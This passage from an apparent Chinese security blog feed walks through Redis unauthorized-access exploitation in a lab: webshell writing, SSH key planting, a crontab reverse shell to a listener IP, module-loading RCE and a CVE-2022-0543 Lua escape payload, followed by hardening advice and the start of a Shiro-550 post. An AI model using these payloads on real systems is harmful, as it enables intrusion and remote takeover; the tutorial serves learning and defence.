<span class="hljs-comment">#将redis.conf拷贝到/etc/目录下</span><br>redis-server /etc/redis.conf  <span class="hljs-comment"># 使用/etc/目录下的redis.conf文件中的配置启动redis服务</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241007215049741.png"></p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>为了方便，在windows攻击机里下载一个redis clinet</p><p>下载地址：<a href="https://github.com/caoxinyu/RedisClient/releases">https://github.com/caoxinyu/RedisClient/releases</a> （利用redis写webshell测试使用）</p><p><img src="https://img1.plumstar.cn/upload5image-20241007221405793.png"></p><p>使用redis clinet 直接无账号成功登录redis，从登录结果可以看出redis未启用认证。</p><p><img src="https://img1.plumstar.cn/upload5image-20241007221243082.png"></p><h3 id="直接写shell"><a href="#直接写shell" class="headerlink" title="直接写shell"></a>直接写shell</h3><p>未授权验证成功，可以直接往里写webshell</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">利用前提：<br>靶机redis未授权，在攻击机能用redis clinet连接，如上图，并未登录验证<br>靶机开启web服务，并且知道网站路径，还需要具有文件读写增删改查权限<br></code></pre></td></tr></table></figure><p>这里我们调出Console，用来执行命令</p><p><img src="https://img1.plumstar.cn/upload5image-20241007221830020.png"></p><p>我们这里因为是本地搭建，靶机网站路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;，将shell写在这个目录下即可</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename test.php</span><br><span class="language-xml">set webshell &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241007223550599.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241007223804643.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241007224937123.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241007225001630.png"></p><p>执行完之后去靶机查看目录下，成功写入webshell</p><p><img src="https://img1.plumstar.cn/upload5image-20241007225114229.png"></p><p>后续后渗透这里就不再继续下去了，这里同样也可以直接反弹shell</p><h3 id="写-ssh-keygen-公钥登录服务器"><a href="#写-ssh-keygen-公钥登录服务器" class="headerlink" title="写 ssh-keygen 公钥登录服务器"></a>写 ssh-keygen 公钥登录服务器</h3><p>靶机开启redis服务，我这里靶机（redis服务端）为192.168.158.143，是一台kali</p><p><img src="https://img1.plumstar.cn/upload5image-20241023180830561.png"></p><p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p><p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p><blockquote><p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端； </p><p>（2）客户端发起登录请求，发送自己的相关信息； </p><p>（3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端； </p><p>（4）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证； </p><p>（5）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。</p></blockquote><p><strong>条件：</strong></p><blockquote><p>Redis服务使用ROOT账号启动</p><p>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p></blockquote><p>在攻击机本地生成公钥文件，为我们的公钥文件设置一个私钥</p><p>公钥文件默认路径：&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br><span class="hljs-built_in">cd</span> /root/.ssh<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241023181041441.png"></p><p>将生成的公钥也就是id_rsa.pub写入ket.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/.ssh<br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-built_in">cat</span> id_rsa.pub;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>)&gt;key.txt<br></code></pre></td></tr></table></figure><p>然后通过未授权访问目标机器，将保存ssh的公钥1.txt写入redis缓存（使用redis-cli -h ip命令连接靶机，将文件写入）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.ssh/key.txt |redis-cli -h 192.168.158.143 -x <span class="hljs-built_in">set</span> pub<br></code></pre></td></tr></table></figure><p>然后执行下列命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.158.143<br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh <span class="hljs-comment">#将文件写入这个目录</span><br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys <span class="hljs-comment">#保存文件名为authorized_keys</span><br>save <br></code></pre></td></tr></table></figure><p>去靶机root&#x2F;.ssh&#x2F;目录下可以看到成功写入authorized_keys，</p><p><img src="https://img1.plumstar.cn/upload5image-20241023181234686.png"></p><p>利用公钥进行SSH登录攻击机，第一次需要输入yes</p><p><img src="https://img1.plumstar.cn/upload5image-20241023181421062.png"></p><h3 id="利用crontab计划任务反弹shell"><a href="#利用crontab计划任务反弹shell" class="headerlink" title="利用crontab计划任务反弹shell"></a>利用crontab计划任务反弹shell</h3><p><strong>cron介绍</strong><br>我们经常使用的是crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表，我们可以在以下文件夹内找到相关配置文件。</p><p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名<br>&#x2F;etc&#x2F;crontab 这个文件负责调度各种管理和维护任务。<br>&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的crontab文件或脚本。<br>我们还可以把脚本放在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。<br>其他crontab知识可以参考：<a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></p><p><strong>注意：</strong><br>在不同系统中，root的位置是不一样的<br>在kali和ubuntu中，其文件位置为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root，在centos系列中位置为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root，通常情况下没有root文件，需要自己创建。</p><p>攻击机监听端口：</p><p><img src="https://img1.plumstar.cn/upload5image-20241016140625516.png"></p><p>连接redis，写入反弹shell，也可以跟上方一样在console执行，注意kali和centos的定时任务路径不同即可</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">redis<span class="hljs-operator">-</span>cli.exe <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">158.141</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs<br><span class="hljs-keyword">set</span> <span class="hljs-operator">-</span><span class="hljs-operator">.-</span> <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.158.143/9999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241016170208249.png"></p><p>过一分钟左右监听就能收到shell了</p><p><img src="https://img1.plumstar.cn/upload5image-20241016170547121.png"></p><h3 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h3><p>如果你的redis-info模块没法用，更新一下nmap可能会有用</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">6379</span> --script redis-<span class="hljs-literal">info</span> <span class="hljs-number">192.168.158.143</span><br>地址：https://svn.nmap.org/nmap/scripts/redis-info.nse<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241023182134373.png"></p><h1 id="redis未授权访问（主从复制）"><a href="#redis未授权访问（主从复制）" class="headerlink" title="redis未授权访问（主从复制）"></a>redis未授权访问（主从复制）</h1><p>本质也是未授权访问，但是因为只存在于4.x、5.x版本中，所以单独写出来</p><p>Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主、从机数据都是一样的，从机只负责读，主机只负责写。在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p><p>漏洞编号：<strong>cnvd_2019_21763</strong></p><p><strong>原理：</strong></p><blockquote><p> Redis如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p> 在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p></blockquote><p><strong>条件：</strong></p><blockquote><p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p><p>redis弱密码或者无密码</p><p>root启动redis</p></blockquote><p>原理倒是很简单也很易懂，整个还是建立在redis未授权基础上的漏洞</p><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>因为之前服务端我搭建的是2.x版本的，要重新搭建，直接用现成的靶场也可以，我这里就再搭建一个4.x版本的redis，毕竟搭建redis不是那么麻烦的</p><p><a href="https://vulfocus.cn/">https://vulfocus.cn/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxf redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz   #解压<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>    #进入解压的文件夹内<br><span class="hljs-attribute">make</span>  <br><span class="hljs-attribute">make</span> install #编译<br></code></pre></td></tr></table></figure><p>切换个版本就好，把之前2.x版本的东西覆盖一下，注意这里要将配置文件中的bind参数改为0.0.0.0或者注释掉，并且修改protected-mode为no允许外连</p><p><img src="https://img1.plumstar.cn/upload5image-20241023212507905.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241023213647188.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241023212536987.png"></p><h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>下载漏洞利用工具，也有一个整体的利用项目：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>我这里是用了另一个佬的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand<br><span class="hljs-built_in">cd</span> RedisModules-ExecuteCommand/<br>make <span class="hljs-comment"># 生成module.so</span><br></code></pre></td></tr></table></figure><p>下载利用脚本并运行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/Ridter/redis-rce.git<br>pip install -r requirements.txt #安装所需依赖<br><span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">158.143</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">6379</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">158.141</span> -<span class="hljs-keyword">f</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">so</span> #这个<span class="hljs-built_in">exp</span>就是上面生成的module.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241023220951181.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>本质上还是因为未授权访问导致的命令执行漏洞</p><h1 id="Redis-Lua沙盒绕过命令执行"><a href="#Redis-Lua沙盒绕过命令执行" class="headerlink" title="Redis Lua沙盒绕过命令执行"></a>Redis Lua沙盒绕过命令执行</h1><p>也是建立在未授权访问的基础上产生的该漏洞</p><h2 id="漏洞描述及影响范围"><a href="#漏洞描述及影响范围" class="headerlink" title="漏洞描述及影响范围"></a>漏洞描述及影响范围</h2><p>Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力</p><p>Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令；要利用此漏洞，攻击者需具有执行 eval 命令的权限（攻击者经过认证、或者 Redis 本身未设置鉴权检查）</p><p>只影响运行在 Debian 系的 Linux 发行版系统（Debian、Ubuntu 等）上的 Redis 服务，其他系统上的 Redis 服务不受影响。</p><p>漏洞编号：<strong>CVE-2022-0543</strong></p><h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通俗点来讲就是借助Lua沙箱中遗留的这个对象提供的方法加载动态链接库liblua里的函数，逃逸沙箱执行任意命令</p><p>vulfocus在线靶场、vulhub或者自己搭建redis</p><p><a href="https://vulfocus.cn/">https://vulfocus.cn/</a></p><h2 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#连接redis</span><br>redis-<span class="hljs-keyword">cli</span> -h ip地址 -p 端口号<br></code></pre></td></tr></table></figure><p>我们借助Lua沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>。在Lua中执行这个导出函数，即可获得<code>io</code>库，再使用其执行命令：</p><p>值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。Vulhub环境（Ubuntu fiocal）中，这个路径是<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">#获取id<br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241024004739364.png"></p><p>这里是在线靶场，直接在对应目录下找flag即可</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">#执行命令ls /tmp获取flag<br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;ls /tmp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241024004906634.png"></p><h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>目前官方已有安全版本，请受影响的用户尽快升级至安全版本进行防护，参考链接：#1005787 - redis: CVE-2022-0543 - Debian Bug report logs。</p><p>安全版本：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Debian</span> Redis：<br><span class="hljs-attribute">5</span>:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14</span>-<span class="hljs-number">1</span>+deb10u2<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">16</span>-<span class="hljs-number">1</span>+deb11u2<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">16</span>-<span class="hljs-number">2</span><br><br><span class="hljs-attribute">Ubuntu</span> Redis：<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">15</span>-<span class="hljs-number">1</span>ubuntu0.<span class="hljs-number">1</span><br><span class="hljs-attribute">5</span>:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span>-<span class="hljs-number">2</span>ubuntu0.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="Windows下如何getshell"><a href="#Windows下如何getshell" class="headerlink" title="Windows下如何getshell"></a>Windows下如何getshell</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">写入webshell，需要知道web路径<br>写入启动项，需要目标服务器重启<br>写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。<br></code></pre></td></tr></table></figure><h1 id="批量检测未授权redis脚本"><a href="#批量检测未授权redis脚本" class="headerlink" title="批量检测未授权redis脚本"></a>批量检测未授权redis脚本</h1><p><a href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p><h1 id="修复方式及加固"><a href="#修复方式及加固" class="headerlink" title="修复方式及加固"></a>修复方式及加固</h1><p>1、禁止一些高危命令（重启redis才能生效)</p><ul><li>修改 redis.conf 文件，禁用远程修改 DB 文件地址</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">FLUSHALL</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">EVAL</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><ul><li>或者通过修改redis.conf文件，改变这些高危命令的名称</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">FLUSHALL</span> <span class="hljs-string">&quot;name1&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;name2&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">EVAL</span> <span class="hljs-string">&quot;name3&quot;</span><br></code></pre></td></tr></table></figure><p>2、以低权限运行 Redis 服务（重启redis才能生效）</p><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">groupadd -<span class="hljs-attribute">r</span> redis &amp;&amp; useradd -<span class="hljs-attribute">r</span> -<span class="hljs-selector-tag">g</span> redis redis<br></code></pre></td></tr></table></figure><p>3、为 Redis 添加密码验证（重启redis才能生效）</p><p>修改 redis.conf 文件，添加</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">requirepass mypassword<br>（注意redis不要用-<span class="hljs-selector-tag">a</span>参数，明文输入密码，连接后使用auth认证）<br></code></pre></td></tr></table></figure><p>4、禁止外网访问 Redis（重启redis才能生效）</p><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bind</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错。</p><p>5、修改默认端口</p><p>修改配置文件redis.conf文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Port</span> <span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure><p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p><p>6、保证 authorized_keys 文件的安全</p><p>为了保证安全，您应该阻止其他用户添加新的公钥。</p><ul><li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 400 ~/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><ul><li>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">chattr +i ~<span class="hljs-regexp">/.ssh/</span>authorized_keys<br></code></pre></td></tr></table></figure><ul><li>然而，用户还可以重命名 ~&#x2F;.ssh，然后新建新的 ~&#x2F;.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~.&#x2F;ssh 的 immutable 权限：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i ~/.ssh<br></code></pre></td></tr></table></figure><p>7、设置防火墙策略</p><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p>]]></content>
    
    
    <categories>
      
      <category>安全问题整理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化Shiro篇01-Shiro550流程分析</title>
    <link href="/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <url>/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p><strong>shiro550 的根本原因：固定 key 加密</strong></p><p>老漏洞了，不过之前写的不知道让我丢哪里去了，只剩下复现在，上一篇文章有简单复现，但是那个跟技术就不沾边了，重新写一下漏洞的分析而且现在CommonsCollections链也已经出到这么多了</p><p>任何反序列化漏洞还是要借助具体案例来进行学习，莫名其妙就写了7k多</p><h1 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h1><p>用的环境是下面的，jdk和tomcat不同版本我没有试过</p><ul><li>jdk8u65</li><li><a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/">Tomcat8</a></li><li>shiro 1.2.4</li></ul><p>环境就不能用docker了，jdk8u65 和 tomcat8 的配置，一步步安装即可，根据自己的pc下载</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2014.48.46@2x.png"></p><p>测试一下tomcat</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.04.41@2x.png"></p><h2 id="IDEA-打开这个项目，去到-Settings-界面"><a href="#IDEA-打开这个项目，去到-Settings-界面" class="headerlink" title="IDEA 打开这个项目，去到 Settings 界面"></a>IDEA 打开这个项目，去到 Settings 界面</h2><p>代码直接用p牛的即可，IDEA打开这个项目然后进行下面的配置</p><ul><li>P牛的项目：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></li></ul><p>如图配置，在 Add 的时候选择 <strong>Tomcat Server</strong> 这一选项。</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2014.49.22@2x.png"></p><h2 id="配置-Edit-Configurations"><a href="#配置-Edit-Configurations" class="headerlink" title="配置 Edit Configurations"></a>配置 Edit Configurations</h2><p>p牛都弄好了，配置一下即可</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2014.56.17@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.13.59@2x.png"></p><p>运行爆红不需要管，IEDA会直接弹到我们的页面</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.14.56@2x.png"></p><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。</li></ul><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-04%20at%2015.30.22@2x.png"></p><p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p><h2 id="漏洞角度分析-Cookie"><a href="#漏洞角度分析-Cookie" class="headerlink" title="漏洞角度分析 Cookie"></a>漏洞角度分析 Cookie</h2><p>直接从cookie出发即可，cookie是经过某种加密并且<strong>知晓 Shiro 的加密过程之后，可以人为构造恶意的 Cookie 参数，从而实现命令执行的目的</strong></p><ul><li>要找 Cookie 的加密过程，直接在 IDEA 里面全局搜索 Cookie，去找 Shiro 